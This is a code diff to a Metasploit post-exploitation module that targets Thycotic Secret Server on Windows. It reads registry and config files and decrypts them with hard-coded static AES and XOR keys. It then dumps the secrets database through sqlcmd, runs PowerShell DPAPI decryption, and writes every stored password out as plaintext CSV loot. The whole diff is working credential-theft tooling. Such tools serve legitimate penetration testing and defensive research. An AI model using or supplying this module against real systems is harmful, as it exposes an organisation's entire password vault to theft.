@@ -9,6 +9,7 @@ class MetasploitModule < Msf::Post
   include Msf::Post::Common
   include Msf::Post::File
   include Msf::Post::Windows::MSSQL
+  include Msf::Post::Windows::Powershell
   include Msf::Post::Windows::Registry
 
   Rank = ManualRanking
@@ -39,9 +40,21 @@ class MetasploitModule < Msf::Post
           [
             'Dump',
             {
-              'Description' => 'Dump Secret Server'
+              'Description' => 'Export Secret Server database and perform decryption'
             }
-          ]
+          ],
+          [
+            'Export',
+            {
+              'Description' => 'Export Secret Server database'
+            }
+          ],
+          [
+            'Decrypt',
+            {
+              'Description' => 'Decrypt Secret Server Database export'
+            }
+          ],
         ],
         'DefaultAction' => 'Dump',
         'Notes' => {
@@ -52,69 +65,102 @@ class MetasploitModule < Msf::Post
         'Privileged' => true
       )
     )
-
     register_options([
-      OptBool.new('LOOT_ONLY', [ false, 'Only loot the encryption keys and database dump for offline decryption', false ])
+      OptPath.new('CSVFILE', [ false, 'Path to database dump CSV file' ])
     ])
   end
 
-  def loot_only
-    datastore['LOOT_ONLY']
+  def csv_loot
+    datastore['CSVFILE']
   end
 
-  def export_header_row
-    'SecretID,LastModifiedDate,Active,SecretType,SecretName,IsEncrypted,IsSalted,Use256Key,SecretFieldName,ItemKey,IvMEK,ItemValue,ItemValue2,IV'
+  def export_header_row_legacy
+    'SecretID,Active,SecretType,SecretName,IsEncrypted,IsSalted,Use256Key,SecretFieldName,ItemValue,ItemValue2,IV'
+  end
+
+  def export_header_row_modern
+    'SecretID,Active,SecretType,SecretName,IsEncrypted,IsSalted,Use256Key,SecretFieldName,ItemKey,IvMEK,ItemValue,ItemValue2,IV'
   end
 
   def result_header_row
-    'SecretID,LastModifiedDate,Active,SecretType,SecretName,FieldName,Plaintext,Plaintext2'
+    'SecretID,Active,SecretType,SecretName,FieldName,Plaintext,Plaintext2'
   end
 
   def run
-    print_status('Validating target ...')
-    ss_web_path = get_secretserver_config
-    print_status('Decrypt database.config ...')
-    init_thycotic_db(ss_web_path)
-    print_status('Decrypt encryption.config ...')
-    init_thycotic_encryption(ss_web_path)
-    print_status('Init SQL client ...')
-    init_sql
+    if action.name.downcase == 'decrypt' && !csv_loot
+      print_error('No database export file specified')
+      raise Msf::OptionValidateError, ['CSVFILE']
+    end
+    init_module
+    case action.name.downcase
+    when 'dump'
+      print_status('Performing export and decryption of Secret Server SQL database')
+      encrypted_csv_file = export
+      print_good("Encrypted Secret Server Database Dump: #{encrypted_csv_file}")
+      decrypted_csv_file = decrypt(encrypted_csv_file)
+      print_good("Decrypted Secret Server Database Dump: #{decrypted_csv_file}")
+    when 'export'
+      print_status('Performing export of Secret Server SQL database to CSV file')
+      encrypted_csv_file = export
+      print_good("Encrypted Secret Server Database Dump: #{encrypted_csv_file}")
+    when 'decrypt'
+      print_status('Performing decryption of Secret Server SQL database export')
+      decrypted_csv_file = decrypt(csv_loot)
+      print_good("Decrypted Secret Server Database Dump: #{decrypted_csv_file}")
+    end
+  end
+
+  def export
     csv = dump_thycotic_db
     total_rows = csv.count
-    fail_with(Msf::Exploit::Failure::NoTarget, 'No rows in import file CSV dataset') unless total_rows > 0
-    print_good("#{total_rows} rows loaded, #{@ss_total_secrets} unique SecretIDs")
+    print_good("#{total_rows} rows exported, #{@ss_total_secrets} unique SecretIDs")
     encrypted_data = csv.to_s.delete("\000")
-    p = store_loot('ss_enc', 'CSV', rhost, encrypted_data, "#{@ss_db_name}.csv", 'Encrypted Database Dump')
-    print_good("Encrypted Secret Server Database Dump: #{p}")
-    return if loot_only
+    store_loot('thycotic_secretserver_enc', 'text/csv', rhost, encrypted_data, "#{@ss_db_name}.csv", 'Encrypted Database Dump')
+  end
 
-    result_rows = decrypt_thycotic_db(csv)
-    fail_with(Msf::Exploit::Failure::NoTarget, 'Filed to decrypt CSV dataset') unless result_rows
+  def decrypt(csv_file)
+    csv = read_csv_file(csv_file)
+    total_rows = csv.count
+    fail_with(Msf::Exploit::Failure::NoTarget, 'No rows in import file CSV dataset') unless total_rows > 1
+    print_good("#{total_rows} rows loaded, #{@ss_total_secrets} unique SecretIDs")
+    result = decrypt_thycotic_db(csv)
+    ss_processed_rows = result[:processed_rows]
+    ss_blank_rows = result[:blank_rows]
+    ss_decrypted_rows = result[:decrypted_rows]
+    ss_plaintext_rows = result[:plaintext_rows]
+    ss_failed_rows = result[:failed_rows]
+    result_rows = result[:result_csv]
+    print_error('Failed to decrypt CSV dataset') unless result_rows
     total_result_rows = result_rows.count - 1 # Do not count header row
     total_result_secrets = result_rows['SecretID'].uniq.count - 1
-    if @ss_processed_rows == @ss_failed_rows || total_result_rows <= 0
-      fail_with(Msf::Exploit::Failure::Unknown, 'No rows could be processed')
-    elsif @ss_failed_rows > 0
-      print_warning("#{@ss_processed_rows} rows processed (#{@ss_failed_rows} rows failed)")
+    if ss_processed_rows == ss_failed_rows || total_result_rows <= 0
+      print_error('No rows could be processed')
+    elsif ss_failed_rows > 0
+      print_warning("#{ss_processed_rows} rows processed (#{ss_failed_rows} rows failed)")
     else
-      print_good("#{@ss_processed_rows} rows processed")
+      print_good("#{ss_processed_rows} rows processed")
     end
-    total_records = @ss_decrypted_rows + @ss_plaintext_rows
-    print_status("#{total_records} rows recovered: #{@ss_plaintext_rows} plaintext, #{@ss_decrypted_rows} decrypted (#{@ss_blank_rows} blank)")
+    total_records = ss_decrypted_rows + ss_plaintext_rows
+    print_status("#{total_records} rows recovered: #{ss_plaintext_rows} plaintext, #{ss_decrypted_rows} decrypted (#{ss_blank_rows} blank)")
     decrypted_data = result_rows.to_s.delete("\000")
-    print_status("#{total_result_rows} rows written (#{@ss_blank_rows} blank rows withheld)")
+    print_status("#{total_result_rows} rows written (#{ss_blank_rows} blank rows withheld)")
     print_good("#{total_result_secrets} unique SecretID records recovered")
-    p = store_loot('ss_dec', 'CSV', rhost, decrypted_data, "#{@ss_db_name}.csv", 'Decrypted Database Dump')
-    print_good("Decrypted Secret Server Database Dump: #{p}")
+    store_loot('thycotic_secretserver_dec', 'text/csv', rhost, decrypted_data, "#{@ss_db_name}.csv", 'Decrypted Database Dump')
   end
 
   def dump_thycotic_db
-    sql_cmd = "#{@sql_client} -d \"#{@ss_db_name}\" -S #{@ss_db_instance_path} -U \"#{@ss_db_user}\" -P \"#{@ss_db_pass}\" -Q \"SET NOCOUNT ON;SELECT s.SecretID,s.LastModifiedDate,s.Active,CONVERT(VARBINARY(256),t.SecretTypeName) SecretType,CONVERT(VARBINARY(256),s.SecretName) SecretName,i.IsEncrypted,i.IsSalted,i.Use256Key,CONVERT(VARBINARY(256),f.SecretFieldName) SecretFieldName,s.[Key],s.IvMEK,i.ItemValue,i.ItemValue2,i.IV FROM
-tbSecretItem AS i JOIN tbSecret AS s ON (s.SecretID=i.SecretID) JOIN tbSecretField AS f ON (i.SecretFieldID=f.SecretFieldID) JOIN tbSecretType AS t ON (s.SecretTypeId=t.SecretTypeID)\" -h-1 -s\",\" -w 65535 -W -I"
-    print_status('Dump Secret Server DB ...')
+    if @ss_build <= 8.7 # REALLY old-style: ItemKey and MekIV do not exist
+      sql_query = 'SET NOCOUNT ON;SELECT s.SecretID,s.Active,CONVERT(VARBINARY(256),t.SecretTypeName) SecretType,CONVERT(VARBINARY(256),s.SecretName) SecretName,i.IsEncrypted,i.IsSalted,i.Use256Key,CONVERT(VARBINARY(256),f.SecretFieldName) SecretFieldName,i.ItemValue,i.ItemValue2,i.IV FROM tbSecretItem AS i JOIN tbSecret AS s ON (s.SecretID=i.SecretID) JOIN tbSecretField AS f ON (i.SecretFieldID=f.SecretFieldID) JOIN tbSecretType AS t ON (s.SecretTypeId=t.SecretTypeID)'
+      export_header_row = export_header_row_legacy
+    else
+      sql_query = 'SET NOCOUNT ON;SELECT s.SecretID,s.Active,CONVERT(VARBINARY(256),t.SecretTypeName) SecretType,CONVERT(VARBINARY(256),s.SecretName) SecretName,i.IsEncrypted,i.IsSalted,i.Use256Key,CONVERT(VARBINARY(256),f.SecretFieldName) SecretFieldName,s.[Key],s.IvMEK,i.ItemValue,i.ItemValue2,i.IV FROM tbSecretItem AS i JOIN tbSecret AS s ON (s.SecretID=i.SecretID) JOIN tbSecretField AS f ON (i.SecretFieldID=f.SecretFieldID) JOIN tbSecretType AS t ON (s.SecretTypeId=t.SecretTypeID)'
+      export_header_row = export_header_row_modern
+    end
+    sql_cmd = "#{@sql_client} -d \"#{@ss_db_name}\" -S #{@ss_db_instance_path} -U \"#{@ss_db_user}\" -P \"#{@ss_db_pass}\" -Q \"#{sql_query}\" -h-1 -s\",\" -w 65535 -W -I"
+    print_status('Export Secret Server DB ...')
     query_result = cmd_exec(sql_cmd)
     csv = CSV.parse(query_result.gsub("\r", ''), row_sep: :auto, headers: export_header_row, quote_char: "\x00", skip_blanks: true)
-    fail_with(Msf::Exploit::Failure::NoTarget, 'Error parsing SQL dataset into CSV format') unless csv
+    fail_with(Msf::Exploit::Failure::UnexpectedReply, 'Error parsing SQL dataset into CSV format') unless csv
     @ss_total_secrets = csv['SecretID'].uniq.count
     fail_with(Msf::Exploit::Failure::NoTarget, 'SQL query dataset contains no SecretID column values') unless @ss_total_secrets >= 1 && !csv['SecretID'].uniq.first.nil?
     csv
@@ -136,34 +182,44 @@ tbSecretItem AS i JOIN tbSecret AS s ON (s.SecretID=i.SecretID) JOIN tbSecretFie
         print_error("Row #{current_row} missing SecretID column, skipping")
         next
       end
+      secret_field = [row['SecretFieldName'][2..]].pack('H*')
       secret_ciphertext_1 = row['ItemValue']
+      if secret_ciphertext_1.nil?
+        vprint_warning("SecretID #{secret_id} field #{secret_field} ItemValue nil, excluding")
+        blank_rows += 1
+        next
+      end
       secret_ciphertext_2 = row['ItemValue2']
-      secret_lastmod = DateTime.parse(row['LastModifiedDate']).to_time.strftime('%m/%d/%y %H:%M:%S').to_s
       secret_active = row['Active'].to_i
       secret_name = [row['SecretName'][2..]].pack('H*')
       secret_type = [row['SecretType'][2..]].pack('H*')
       secret_encrypted = row['IsEncrypted'].to_i
+      secret_salted = row['IsSalted'].to_i
       secret_use256 = row['Use256Key'].to_i
-      secret_keyfield_hex = row['ItemKey'][2..]
       secret_iv_hex = row['IV'][2..]
-      secret_field = [row['SecretFieldName'][2..]].pack('H*')
-      if secret_iv_hex == 'FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF' # New-style: ItemKey and ItemIV are part of the key blob
+      if @ss_build >= 10.4 || secret_iv_hex == 'FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF' # New-style: ItemKey and ItemIV are part of the key blob
+        secret_keyfield_hex = row['ItemKey'][2..]
         miv_hex = secret_keyfield_hex[4..35]
         key_hex = secret_keyfield_hex[100..]
         iv_hex = secret_ciphertext_1[4..35]
         value_1_hex = secret_ciphertext_1[100..]
+      elsif @ss_build <= 8.7 # REALLY old-style: ItemKey and MekIV do not exist
+        key_hex = ['FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF'].pack('H*')
+        miv_hex = ['FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF'].pack('H*')
+        iv_hex = secret_iv_hex
+        value_1_hex = secret_ciphertext_1
       else # Old-style: ItemKey and ItemIV are stored as columns
+        key_hex = row['ItemKey'][2..]
         miv_hex = row['IvMEK'][2..]
-        key_hex = secret_keyfield_hex
         iv_hex = secret_iv_hex
         value_1_hex = secret_ciphertext_1
       end
       value_1 = [value_1_hex].pack('H*')
-      miv = [miv_hex].pack('H*')
       key = [key_hex].pack('H*')
       iv = [iv_hex].pack('H*')
+      miv = [miv_hex].pack('H*')
       if secret_encrypted == 1
-        secret_plaintext_1 = thycotic_secret_decrypt(secret_id: secret_id, secret_field: secret_field, secret_value: value_1, secret_key: key, secret_iv: iv, secret_miv: miv, secret_use256: secret_use256)
+        secret_plaintext_1 = thycotic_secret_decrypt(secret_id: secret_id, secret_field: secret_field, secret_value: value_1, secret_key: key, secret_iv: iv, secret_miv: miv, secret_use256: secret_use256, secret_salted: secret_salted)
         if secret_plaintext_1.nil?
           vprint_warning("SecretID #{secret_id} field #{secret_field} ItemValue nil, excluding")
           blank_rows += 1
@@ -192,7 +248,7 @@ tbSecretItem AS i JOIN tbSecret AS s ON (s.SecretID=i.SecretID) JOIN tbSecretFie
         plaintext_rows += 1
       end
       if !secret_plaintext_1.empty? && !secret_plaintext_2.empty?
-        result_line = [secret_id.to_s, secret_lastmod.to_s, secret_active.to_s, secret_type.to_s, secret_name.to_s, secret_field.to_s, secret_plaintext_1.to_s, secret_plaintext_2.to_s]
+        result_line = [secret_id.to_s, secret_active.to_s, secret_type.to_s, secret_name.to_s, secret_field.to_s, secret_plaintext_1.to_s, secret_plaintext_2.to_s]
         result_row = CSV.parse_line(CSV.generate_line(result_line).gsub("\r", ''))
         result_csv << result_row
         vprint_status("SecretID #{secret_id} field #{secret_field} ItemValue recovered: #{secret_disposition}")
@@ -201,36 +257,69 @@ tbSecretItem AS i JOIN tbSecret AS s ON (s.SecretID=i.SecretID) JOIN tbSecretFie
         blank_rows += 1
       end
     end
-    @ss_processed_rows = current_row
-    @ss_blank_rows = blank_rows
-    @ss_decrypted_rows = decrypted_rows
-    @ss_plaintext_rows = plaintext_rows
-    @ss_failed_rows = failed_rows
-    result_csv
+    {
+      processed_rows: current_row,
+      blank_rows: blank_rows,
+      decrypted_rows: decrypted_rows,
+      plaintext_rows: plaintext_rows,
+      failed_rows: failed_rows,
+      result_csv: result_csv
+    }
   end
 
-  def get_secretserver_config
+  def init_module
     @ss_hostname = get_env('COMPUTERNAME')
     print_status("Hostname #{@ss_hostname} IPv4 #{rhost}")
+    get_sql_client
+    fail_with(Failure::Unknown, 'Unable to identify sqlcmd SQL client on target host') unless @sql_client == 'sqlcmd'
+    vprint_good("Found SQL client: #{@sql_client}")
+    ss_web_path = get_secretserver_web_path
+    init_thycotic_db(ss_web_path)
+    get_secretserver_version
+    init_thycotic_encryption(ss_web_path)
+  end
+
+  def read_csv_file(file_name)
+    csv_rows = File.binread(file_name)
+    csv = CSV.parse(csv_rows.gsub("\r", ''), row_sep: :auto, headers: :first_row, quote_char: "\x00", skip_blanks: true)
+    unless csv
+      print_error("Error importing CSV file #{csv_file}")
+      return false
+    end
+    @ss_total_secrets = csv['SecretID'].uniq.count
+    unless @ss_total_secrets >= 1 && !csv['SecretID'].uniq.first.nil?
+      print_error("Provided CSV file #{csv_file} contains no SecretID column values")
+      return false
+    end
+    csv
+  end
+
+  def get_secretserver_web_path
     reg_key = 'HKLM\\SOFTWARE\\Thycotic\\Secret Server\\'
-    fail_with(Msf::Exploit::Failure::NoTarget, "Registry key #{reg_key} not found") unless registry_key_exist?(reg_key)
+    fail_with(Msf::Exploit::Failure::NotFound, "Registry key #{reg_key} not found") unless registry_key_exist?(reg_key)
     ss_web_path = registry_getvaldata(reg_key, 'WebDir')
-    fail_with(Msf::Exploit::Failure::NoTarget, "Could not find WebDir registry entry under #{reg_key}") unless ss_web_path
-    ss_version_xml_file = ss_web_path + 'Version.xml'
-    fail_with(Msf::Exploit::Failure::NoTarget, "Could not find #{ss_version_xml_file}") unless file_exist?(ss_version_xml_file)
-    version_xml = read_file(ss_version_xml_file)
-    xml = Nokogiri::XML(version_xml)
-    ss_version_str = xml.at_xpath('//Version/AssemblyVersion').text
-    vprint_status("Secret Server Build #{ss_version_str}")
+    fail_with(Msf::Exploit::Failure::NotFound, "Could not find WebDir registry entry under #{reg_key}") unless ss_web_path
     vprint_status('Secret Server Web Root:')
     vprint_status("\t#{ss_web_path}")
     ss_web_path
   end
 
-  def init_sql
-    get_sql_client
-    fail_with(Failure::Unknown, 'Unable to identify sqlcmd SQL client on target host') unless @sql_client == 'sqlcmd'
-    print_good("Found SQL client: #{@sql_client}")
+  def get_secretserver_version
+    version_sql_cmd = "#{@sql_client} -d \"#{@ss_db_name}\" -S #{@ss_db_instance_path} -U \"#{@ss_db_user}\" -P \"#{@ss_db_pass}\" -Q \"
+      SET NOCOUNT ON;
+      SELECT TOP 1 CONVERT(INT,REVERSE(PARSENAME(REPLACE(REVERSE(VersionNumber), ',', '.'), 1))) AS [Major],
+      CONVERT(INT,REVERSE(PARSENAME(REPLACE(REVERSE(VersionNumber), ',', '.'), 2))) AS [Minor],
+      CONVERT(INT,REVERSE(PARSENAME(REPLACE(REVERSE(VersionNumber), ',', '.'), 3))) AS [Rev]
+      FROM tbVersion ORDER BY [Major] DESC, [Minor] DESC, [Rev] DESC\" -h-1 -s\",\" -w 65535 -W -I"
+    version_query_result = cmd_exec(version_sql_cmd).gsub("\r", '')
+    csv = CSV.parse(version_query_result.gsub("\r", ''), row_sep: :auto, headers: 'Major,Minor,Rev', quote_char: "\x00", skip_blanks: true)
+    fail_with(Msf::Exploit::Failure::NoTarget, 'Error parsing SQL dataset into CSV format') unless csv
+    ss_build_major = csv['Major'].first.to_i
+    ss_build_minor = csv['Minor'].first.to_i
+    ss_build_rev = csv['Rev'].first.to_i
+    @ss_build = "#{ss_build_major}.#{ss_build_minor}.#{ss_build_rev}".to_f
+    print_status("Secret Server Build #{@ss_build}")
+    print_warning('This module has not been tested against Secret Server versions below 8.4 and may not work') if @ss_build < 8.4
   end
 
   def read_config_file(ss_config_file)
@@ -239,8 +328,17 @@ tbSecretItem AS i JOIN tbSecret AS s ON (s.SecretID=i.SecretID) JOIN tbSecretFie
   end
 
   def init_thycotic_encryption(ss_web_path)
+    print_status('Decrypt encryption.config ...')
     ss_enc_config_file = ss_web_path + 'encryption.config'
-    enc_conf = thycotic_encryption_config_decrypt(read_config_file(ss_enc_config_file))
+    ss_enc_conf_bytes = read_config_file(ss_enc_config_file)
+    if @ss_build >= 10.4
+      vprint_status('Using Modern (AES-256 + XOR) file decryption routine')
+      enc_conf = thycotic_encryption_config_decrypt_modern(ss_enc_conf_bytes)
+    else
+      vprint_status('Using Legacy (AES-128) file decryption routine')
+      enc_conf = thycotic_encryption_config_decrypt_legacy(ss_enc_conf_bytes)
+    end
+    fail_with(Msf::Exploit::Failure::NoTarget, 'Failed to decrypt encryption.config') unless enc_conf
     ss_key_hex = enc_conf['KEY']
     ss_key256_hex = enc_conf['KEY256']
     ss_iv_hex = enc_conf['IV']
@@ -273,14 +371,15 @@ tbSecretItem AS i JOIN tbSecret AS s ON (s.SecretID=i.SecretID) JOIN tbSecretFie
     print_good("\t    IV: #{ss_iv_hex}")
   end
 
-  def thycotic_encryption_config_decrypt(enc_conf_bytes)
+  def thycotic_encryption_config_decrypt_modern(enc_conf_bytes)
     res = {}
     # Burned-in static keys and IV
     aes_key = ['83fb558645767abb199755eafb4fbc5167113da8ee69f13267388dc3adcdb088'].pack('H*')
     aes_iv = ['ad478c63f93d5201e0a1bbfff0072b6b'].pack('H*')
     xor_key = '8200ab18b1a1965f1759c891e87bc32f208843331d83195c21ee03148b531a0e'.scan(/../).map(&:hex)
     ciphertext_bytes = enc_conf_bytes[41..]
-    fail_with(Msf::Exploit::Failure::NoTarget, 'Error decrypting encryption.config') unless (plaintext_conf = aes_cbc_decrypt(ciphertext_bytes, aes_key, aes_iv))
+    return false unless (plaintext_conf = aes_cbc_decrypt(ciphertext_bytes, aes_key, aes_iv))
+
     xor_1 = plaintext_conf[1..4].unpack('l*').first
     xor_2 = plaintext_conf[5..8].unpack('l*').first
     num_keys = xor_1 ^ xor_2
@@ -313,7 +412,42 @@ tbSecretItem AS i JOIN tbSecret AS s ON (s.SecretID=i.SecretID) JOIN tbSecretFie
     res
   end
 
+  def thycotic_encryption_config_decrypt_legacy(enc_conf_bytes)
+    res = {}
+    # Burned-in static keys and IV
+    aes_key_legacy = ['020216980119760c0b79017097830b1d'].pack('H*')
+    aes_iv_legacy = ['7a790a22020b6eb3630cdd080310d40a'].pack('H*')
+    ciphertext_bytes = enc_conf_bytes
+    return false unless (plaintext_conf = aes_cbc_decrypt(ciphertext_bytes, aes_key_legacy, aes_iv_legacy))
+
+    plaintext_conf = plaintext_conf.delete("\000")
+    working_offset = (plaintext_conf.unpack('H*').first.downcase.index(/4b65790556616c7565/) / 2) + 14 # magic bytes
+    loop do
+      k = nil
+      v = nil
+      for is_key in [true, false] do
+        data_len = plaintext_conf[working_offset..working_offset + 1].unpack('C*').first
+        data_val = plaintext_conf[working_offset + 1, data_len]
+        if is_key
+          k = data_val
+          working_offset += data_len + 3
+        else
+          v = data_val
+          working_offset += data_len + 6
+        end
+      end
+      if !k
+        next
+      else
+        res[k.upcase] = v
+      end
+      break if working_offset >= plaintext_conf.length
+    end
+    res
+  end
+
   def init_thycotic_db(ss_web_path)
+    print_status('Decrypt database.config ...')
     ss_db_config_file = ss_web_path + 'database.config'
     db_conf = get_thycotic_database_config(read_config_file(ss_db_config_file))
     db_instance_path = db_conf['DATA SOURCE']
@@ -379,32 +513,47 @@ tbSecretItem AS i JOIN tbSecret AS s ON (s.SecretID=i.SecretID) JOIN tbSecretFie
     secret_iv = options.fetch(:secret_iv)
     secret_miv = options.fetch(:secret_miv)
     secret_use256 = options.fetch(:secret_use256)
-
+    secret_salted = options.fetch(:secret_salted)
     if secret_use256 == 1
       mek = @ss_key256
     else
       mek = @ss_key
     end
+    if secret_salted == 1
+      salted = true
+    else
+      salted = false
+    end
+    vprint_status("SecretID #{secret_id} field #{secret_field} AES-#{mek.length * 8} salted: #{salted}")
     intermediate_key = aes_cbc_decrypt(secret_key, mek, secret_miv)
     if intermediate_key
       decrypted_secret = aes_cbc_decrypt(secret_value, intermediate_key, secret_iv)
     else
-      vprint_error("SecretID #{secret_id} field #{secret_field} intermediate key decryption failed")
-      decrypted_secret = false
+      vprint_warning("SecretID #{secret_id} field #{secret_field} intermediate key decryption failed, attempting MEK decryption")
+      decrypted_secret = aes_cbc_decrypt(secret_value, mek, secret_iv)
     end
     unless decrypted_secret
-      vprint_warning("SecretID #{secret_id} field #{secret_field} decryption failed via intermediate key, attempting item key decryption")
+      vprint_warning("SecretID #{secret_id} field #{secret_field} MEK decryption failed, attempting ItemKey decryption")
       decrypted_secret = aes_cbc_decrypt(secret_value, secret_key, secret_iv)
-      return false unless decrypted_secret
     end
-    plaintext = decrypted_secret.delete("\000")[4..]
-    # Catch where decryption did not throw an exception but produced invalid UTF-8 plaintext
-    # This was evident in a few test cases where the secret value appeared to have been pasted from Microsoft Word
-    if !plaintext.force_encoding('UTF-8').valid_encoding?
-      plaintext = Base64.strict_encode64(decrypted_secret.delete("\000")[4..])
-      print_warning("SecretID #{secret_id} field #{secret_field} contains invalid UTF-8 and will be stored as a Base64 string in the output file")
+    return false unless decrypted_secret
+
+    if @ss_build >= 10.4
+      plaintext = decrypted_secret.delete("\000")[4..]
+    else
+      plaintext = decrypted_secret.delete("\000")
     end
-    plaintext
+    if !plaintext.to_s.empty?
+      # Catch where decryption did not throw an exception but produced invalid UTF-8 plaintext
+      # This was evident in a few test cases where the secret value appeared to have been pasted from Microsoft Word
+      if !plaintext.force_encoding('UTF-8').valid_encoding?
+        plaintext = Base64.strict_encode64(decrypted_secret.delete("\000")[4..])
+        print_warning("SecretID #{secret_id} field #{secret_field} contains invalid UTF-8 and will be stored as a Base64 string in the output file")
+      end
+      return plaintext
+    else
+      return nil
+    end
   end
 
   def xor_decrypt(ciphertext_bytes, xor_key)
@@ -441,8 +590,8 @@ tbSecretItem AS i JOIN tbSecret AS s ON (s.SecretID=i.SecretID) JOIN tbSecretFie
   end
 
   def dpapi_decrypt(b64)
-    cmd_str = "powershell.exe -ep bypass -nop -command \"Add-Type -AssemblyName System.Security;[Text.Encoding]::ASCII.GetString([Security.Cryptography.ProtectedData]::Unprotect([Convert]::FromBase64String('#{b64}'), $Null, 'LocalMachine'))\""
-    plaintext = cmd_exec(cmd_str)
+    cmd_str = "Add-Type -AssemblyName System.Security;[Text.Encoding]::ASCII.GetString([Security.Cryptography.ProtectedData]::Unprotect([Convert]::FromBase64String('#{b64}'), $Null, 'LocalMachine'))"
+    plaintext = psh_exec(cmd_str)
     fail_with(Msf::Exploit::Failure::NoTarget, 'Failed DPAPI LocalMachine decryption') unless plaintext.match?(/^[0-9a-f]+$/i)
     plaintext
   end
